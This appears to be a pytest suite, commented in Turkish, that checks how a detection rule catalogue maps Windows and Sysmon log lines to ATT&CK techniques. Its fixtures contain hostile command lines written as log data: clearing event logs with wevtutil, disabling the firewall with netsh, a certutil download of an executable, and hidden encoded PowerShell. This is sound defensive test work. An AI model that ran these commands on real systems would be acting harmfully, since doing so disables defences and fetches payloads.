"""K1 -- kural katalogu duzeltmesinin davranis sozlesmesi.

Vakalar docs/beklenti_K1_kural_kalitesi.md §3'ten birebir; numaralari
belgedekiyle ayni (a1, a'1, b1, ...). Hepsi GERCEK kanit kapisini
(`evidence_gate_decisions`) ya da kuralin `row_matches`'ini, uretim yolu olan
`text_to_row` ile kurulan satir uzerinde sinar. LLM ve indeks gerekmez.

`susma` = kapinin o teknik icin karar URETMEDIGI durum (katalogda kural yok).
"""

from __future__ import annotations

import pytest

from app.agents.verification import evidence_gate_decisions
from app.mapping.rule_engine import load_rules
from app.mapping.text_input import text_to_row

KURALLAR = load_rules()


def kapi(metin: str, teknik: str) -> str:
    d = {x.technique_id: x.verdict.value
         for x in evidence_gate_decisions([{"attack_id": teknik}], [text_to_row(metin)], KURALLAR)}
    return d.get(teknik, "susma")


AUDIT_CLEARED = 'EventID=1102 Message="The audit log was cleared."'
NETSH_OFF = 'EventID=4688 NewProcessName=C:\\Windows\\System32\\netsh.exe CommandLine="netsh advfirewall set allprofiles state off"'
EVENTLOG_DISABLED = ('EventID=7040 Message="The start type of the Windows Event Log service was changed '
                     'from auto start to disabled."')


# ---------------------------------------------------------------- K1a (§3.1)

def test_a1_audit_log_cleared_confirms_t1685_005():
    assert kapi(AUDIT_CLEARED, "T1685.005") == "confirm"


def test_a2_wevtutil_clear_confirms_t1685_005():
    assert kapi('EventID=4688 NewProcessName=C:\\Windows\\System32\\wevtutil.exe '
                'CommandLine="wevtutil cl Security"', "T1685.005") == "confirm"


def test_a3_system_log_cleared_confirms_t1685_005():
    assert kapi('EventID=104 Message="The System log file was cleared."', "T1685.005") == "confirm"


def test_a4_audit_policy_change_confirms_t1685_001():
    assert kapi('EventID=4719 Message="System audit policy was changed."', "T1685.001") == "confirm"


def test_a5_t1685_001_does_not_claim_the_1102_family():
    assert kapi(AUDIT_CLEARED, "T1685.001") == "reject"


def test_a6_netsh_firewall_off_is_t1686_not_t1685_005():
    assert kapi(NETSH_OFF, "T1686") == "confirm"
    assert kapi(NETSH_OFF, "T1685.005") == "reject"


def test_a7_defender_disabled_confirms_t1685():
    metin = ('EventID=5001 Message="Microsoft Defender Antivirus Real-time Protection '
             'scanning for malware and other potentially unwanted software was disabled."')
    assert kapi(metin, "T1685") == "confirm"


@pytest.mark.parametrize("emekli", ["T1070.001", "T1562.001", "T1562.002", "T1543.001"])
def test_a8_retired_or_misfiled_ids_have_no_rule(emekli):
    assert kapi(AUDIT_CLEARED, emekli) == "susma"


def test_a9_d1_service_imagepath_write_confirms_t1543_003():
    metin = ('EventID=4657 ObjectName="\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\evil\\ImagePath"')
    assert kapi(metin, "T1543.003") == "confirm"


def test_a10_d1_service_install_still_confirms_t1543_003():
    assert kapi("EventID=7045 ServiceName=UpdaterSvc", "T1543.003") == "confirm"


def test_a11_d1_other_service_subkey_rejects_t1543_003():
    metin = ('EventID=4657 ObjectName="\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\x\\Performance"')
    assert kapi(metin, "T1543.003") == "reject"


def test_a12_d2_local_account_behaviour_unchanged():
    assert kapi("EventID=4720 TargetUserName=newuser", "T1136.001") == "confirm"


# --------------------------------------------------------------- K1a' (§3.1')
# K1a'da bu uc vaka BEKLENEN gerilemeydi (a14: reject). K1a' onlari confirm'e
# cevirir; a'1, a'2 ve a'7 o gerilemenin ta kendisidir.

def test_a2_1_firewall_setting_changed_confirms_t1686():
    assert kapi('EventID=4950 Message="A Windows Defender Firewall setting has changed."', "T1686") == "confirm"


def test_a2_2_firewall_rule_added_confirms_t1686():
    assert kapi('EventID=4946 Message="A change has been made to Windows Firewall exception list. '
                'A rule was added."', "T1686") == "confirm"


def test_a2_3_firewall_service_stopped_confirms_t1686():
    assert kapi('EventID=5025 Message="The Windows Defender Firewall service has been stopped."', "T1686") == "confirm"


def test_a2_4_permitted_connection_is_not_a_config_change():
    assert kapi('EventID=5156 Message="The Windows Filtering Platform has permitted a connection."', "T1686") == "reject"


def test_a2_5_rule_partially_ignored_is_outside_the_event_set():
    assert kapi('EventID=4952 Message="Parts of the rule have been ignored because its minor version '
                'number was not recognized by Windows Firewall."', "T1686") == "reject"


def test_a2_6_netsh_rule_still_confirms_t1686():
    assert kapi(NETSH_OFF, "T1686") == "confirm"


def test_a2_7_event_log_service_disabled_confirms_t1685_001():
    assert kapi(EVENTLOG_DISABLED, "T1685.001") == "confirm"


def test_a2_8_other_service_disabled_rejects_t1685_001():
    assert kapi('EventID=7040 Message="The start type of the Print Spooler service was changed from '
                'auto start to disabled."', "T1685.001") == "reject"


def test_a2_9_event_log_service_not_disabled_rejects_t1685_001():
    assert kapi('EventID=7040 Message="The start type of the Windows Event Log service was changed from '
                'demand start to auto start."', "T1685.001") == "reject"


def test_a2_10_audit_policy_rule_unchanged():
    assert kapi('EventID=4719 Message="System audit policy was changed."', "T1685.001") == "confirm"


def test_a2_11_t1685_001_still_does_not_claim_1102():
    assert kapi(AUDIT_CLEARED, "T1685.001") == "reject"


# ---------------------------------------------------------------- K1b (§3.2)
# Ad alanina bakan 11 kosul: tam yol VE taban ad. Kaynak (G kolu) tam yol
# yaziyordu, powercfg kaynagi taban ad -- kural kaynaga gore sessizce korlesiyordu.

BS = chr(92)
AD_KOSULLARI = {  # teknik -> kosulun kabul ettigi ornek ad
    "T1059.003": "cmd.exe", "T1018": "nltest.exe", "T1016": "ipconfig.exe",
    "T1082": "systeminfo.exe", "T1047": "wmic.exe", "T1218.010": "regsvr32.exe",
    "T1218.011": "rundll32.exe", "T1204.002": "mshta.exe", "T1566.001": "wscript.exe",
    "T1560": "7z.exe",
}


def _ad_kosulu(teknik: str):
    """Teknigin `process.name` uzerindeki (pozitif ya da negatif) kosulu."""
    for r in KURALLAR:
        if r.technique_id != teknik:
            continue
        for fc in r.field_conditions:
            if getattr(fc, "field", None) == "process.name":
                return fc
    raise AssertionError(f"{teknik}: process.name kosulu yok")


@pytest.mark.parametrize("teknik,ad", sorted(AD_KOSULLARI.items()))
def test_b1_full_path_still_matches(teknik, ad):
    assert _ad_kosulu(teknik).matches({"process.name": f"C:{BS}Windows{BS}System32{BS}{ad}"})


@pytest.mark.parametrize("teknik,ad", sorted(AD_KOSULLARI.items()))
def test_b2_bare_file_name_now_matches(teknik, ad):
    assert _ad_kosulu(teknik).matches({"process.name": ad})


def test_b3_name_that_only_ends_like_cmd_does_not_match():
    assert not _ad_kosulu("T1059.003").matches({"process.name": "notcmd.exe"})
    assert not _ad_kosulu("T1059.003").matches({"process.name": f"C:{BS}Tools{BS}notcmd.exe"})


def test_b4_cmd_in_command_line_only_does_not_fire_t1059_003():
    metin = ('EventID=4688 NewProcessName=powershell.exe '
             'CommandLine="powershell.exe -Command cmd.exe /c whoami"')
    assert kapi(metin, "T1059.003") == "reject"


def test_b5_bare_edr_name_is_excluded_from_t1055():
    assert not _ad_kosulu("T1055").matches({"process.name": "MsMpEng.exe"})


def test_b6_full_path_edr_name_still_excluded():
    yol = f"C:{BS}ProgramData{BS}Microsoft{BS}Windows Defender{BS}Platform{BS}MsMpEng.exe"
    assert not _ad_kosulu("T1055").matches({"process.name": yol})


def test_b7_bare_non_edr_name_fires_t1055():
    assert kapi("EventID=10 SourceImage=evil.exe TargetImage=C:\\Windows\\System32\\lsass.exe "
                "ProcessName=evil.exe", "T1055") == "confirm"


def test_c1_urlcache_is_t1105_not_t1140():
    metin = ('EventID=4688 NewProcessName=C:\\Windows\\System32\\certutil.exe '
             'CommandLine="certutil -urlcache -split -f http://x/p.exe C:\\Users\\Public\\p.exe"')
    assert kapi(metin, "T1140") == "reject"
    assert kapi(metin, "T1105") == "confirm"


def test_c2_decode_is_t1140():
    metin = ('EventID=4688 NewProcessName=C:\\Windows\\System32\\certutil.exe '
             'CommandLine="certutil -decode in.b64 out.exe"')
    assert kapi(metin, "T1140") == "confirm"


def test_c3_t1105_pattern_unchanged():
    kosullar = [r for r in KURALLAR if r.technique_id == "T1105"]
    assert len(kosullar) == 1
    desenler = [alt.must_match.pattern for fc in kosullar[0].field_conditions for alt in getattr(fc, "conditions", ())]
    assert "(certutil.*-urlcache|bitsadmin.*/transfer|invoke-webrequest|downloadfile)" in desenler


# ---------------------------------------------------------------- K1d (§3.4)
# Windows ve Sysmon ayni davranisi farkli olay ID'leriyle yazar; kural birini
# beyan edip digerini atlarsa teknik gercekten olsa bile eslesemez.

def test_d1_sysmon_process_create_cmd_confirms_t1059_003():
    assert kapi("EventID=1 Image=C:\\Windows\\System32\\cmd.exe CommandLine=\"cmd.exe /c whoami\"",
                "T1059.003") == "confirm"


def test_d2_sysmon_schtasks_create_confirms_query_rejects():
    assert kapi("EventID=1 Image=C:\\Windows\\System32\\schtasks.exe "
                "CommandLine=\"schtasks /create /tn Upd /tr C:\\x.exe /sc onlogon\"", "T1053.005") == "confirm"
    assert kapi("EventID=1 Image=C:\\Windows\\System32\\schtasks.exe CommandLine=\"schtasks /query\"",
                "T1053.005") == "reject"


def test_d3_sysmon_encoded_powershell_confirms_t1059_001():
    assert kapi("EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
                "CommandLine=\"powershell.exe -nop -w hidden -enc JABjAGwA\"", "T1059.001") == "confirm"


def test_d4_sysmon_nltest_confirms_t1018():
    assert kapi("EventID=1 Image=C:\\Windows\\System32\\nltest.exe CommandLine=\"nltest /dclist:corp\"",
                "T1018") == "confirm"


def test_d5_sysmon_wevtutil_clear_confirms_t1685_005():
    assert kapi("EventID=1 Image=C:\\Windows\\System32\\wevtutil.exe CommandLine=\"wevtutil cl System\"",
                "T1685.005") == "confirm"


def test_d6_d3_sysmon_process_access_to_lsass_confirms_t1003_001():
    assert kapi("EventID=10 SourceImage=C:\\Users\\Public\\x.exe TargetImage=C:\\Windows\\System32\\lsass.exe",
                "T1003.001") == "confirm"
    assert kapi("EventID=10 SourceImage=C:\\Users\\Public\\x.exe TargetImage=C:\\Windows\\System32\\notepad.exe",
                "T1003.001") == "reject"


def test_d7_startup_folder_file_creation_confirms_t1547_001():
    baslangic = ("EventID=11 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
                 "TargetFilename=\"C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs"
                 "\\Startup\\run.vbs\"")
    assert kapi(baslangic, "T1547.001") == "confirm"
    assert kapi("EventID=11 Image=C:\\Windows\\System32\\notepad.exe "
                "TargetFilename=\"C:\\Users\\u\\Documents\\notes.txt\"", "T1547.001") == "reject"
    assert kapi("EventID=4657 ObjectName=\"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"",
                "T1547.001") == "confirm"


def test_d8_d3_object_access_staging_archive_confirms_t1074():
    assert kapi("EventID=4663 ObjectName=\"C:\\Users\\Public\\stage.zip\"", "T1074") == "confirm"
    assert kapi("EventID=4663 ObjectName=\"C:\\Users\\Public\\notes.txt\"", "T1074") == "reject"
    assert kapi("EventID=11 TargetFilename=\"C:\\Users\\Public\\stage.zip\"", "T1074") == "confirm"


def test_d9_d3_sam_rule_event_list_unchanged():
    """T1003.002'ye Sysmon 11 EKLENMEDI: 11 dosya OLUSTURMADIR, SAM kovanini
    okumak degil (beklenti §3.4)."""
    olaylar = {e for r in KURALLAR if r.technique_id == "T1003.002" for e in r.required_event_ids}
    assert olaylar == {"4688", "4656", "4663", "1"}


def test_b8_office_parent_with_bare_child_name_fires_t1204_002():
    """Gorev 24 O5: gercek (brace_kv) kaynak cocuk sureci TABAN adla, ebeveyni
    yalnizca YOLLA yaziyor. Ebeveyn adi yoldan turetilir (Gorev 24); cocuk
    kosulu K1b'den once ters bolu istedigi icin hic saglanmiyordu."""
    metin = ("{Event ID=4688, Process Name=cmd.exe, Process Path=C:\\Windows\\System32\\cmd.exe, "
             "Command=cmd.exe /c whoami, "
             "Parent Process Path=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE}")
    assert kapi(metin, "T1204.002") == "confirm"
